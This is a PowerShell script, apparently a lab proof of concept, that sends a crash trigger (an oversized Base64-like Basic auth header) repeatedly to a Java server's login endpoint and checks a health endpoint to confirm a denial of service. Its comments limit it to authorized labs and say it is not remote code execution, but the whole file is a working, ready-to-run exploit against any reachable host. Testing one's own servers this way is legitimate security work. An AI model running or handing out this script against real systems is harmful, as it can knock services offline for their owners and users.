param(
    [Parameter(Mandatory = $true)]
    [string]$Target,

    [int]$Port = 8080,
    [int]$Requests = 10,
    [int]$TimeoutSec = 15,
    [switch]$SkipTcpCheck
)

# Authorized lab only. Sends the public Java4Shell crash trigger to a target
# you control. This is not an RCE exploit.

$ErrorActionPreference = 'Stop'
$baseUrl = "http://${Target}:$Port"
$trigger = ('A' * 64) + '='
$cred = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('labuser:labpass'))

function Invoke-Hit {
    param([string]$Url, [string]$Auth)
    try {
        $r = Invoke-WebRequest -Uri $Url -Headers @{ Authorization = "Basic $Auth" } `
            -UseBasicParsing -TimeoutSec $TimeoutSec
        return "HTTP $($r.StatusCode)"
    } catch {
        if ($_.Exception.Response) {
            return "HTTP $([int]$_.Exception.Response.StatusCode)"
        }
        return "ERROR $($_.Exception.Message)"
    }
}

Write-Host "Target: $baseUrl"

if (-not $SkipTcpCheck) {
    $tcp = Test-NetConnection -ComputerName $Target -Port $Port -WarningAction SilentlyContinue
    if (-not $tcp.TcpTestSucceeded) {
        Write-Host "TCP $Port on $Target is not reachable. Check VM network, firewall, and that the server is running."
        exit 1
    }
    Write-Host "TCP $Port reachable."
}

"health:   $(Invoke-Hit "$baseUrl/health" $cred)"
"baseline: $(Invoke-Hit "$baseUrl/login" $cred)"

$crashed = $false
for ($i = 1; $i -le $Requests; $i++) {
    $result = Invoke-Hit "$baseUrl/login" $trigger
    "trigger ${i}: $result"
    if ($result -match 'ERROR') {
        $probe = Invoke-Hit "$baseUrl/health" $cred
        if ($probe -match 'ERROR') {
            Write-Host 'Target stopped responding right after the trigger.'
            $crashed = $true
            break
        }
    }
    Start-Sleep -Milliseconds 200
}

if ($crashed) {
    'RESULT: probable crash/DoS - check hs_err_pid*.log on the target.'
} else {
    'RESULT: target survived. Normal on CPUs without AVX-512 VBMI, on a fixed JDK, or with a mitigation flag.'
}
